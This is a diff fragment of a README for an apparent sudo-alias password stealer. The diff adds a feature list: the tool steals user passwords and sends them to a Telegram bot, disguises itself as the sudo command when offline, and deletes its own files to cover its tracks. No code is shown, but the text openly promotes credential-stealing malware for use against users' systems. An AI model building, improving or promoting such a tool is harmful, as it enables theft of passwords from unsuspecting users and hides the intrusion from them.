@@ -5,7 +5,9 @@ A tool that simply sets alias to sudo command, then sends captured passwords and
 
 ### Features
 
-- 
+- Steals user passwords and sends them to a Telegram bot  
+- If there is no internet connection, it disguises itself as a sudo command to prevent data loss  
+- After stealing the passwords, the script covers its tracks and deletes all associated files
 
 ### Setup 
 
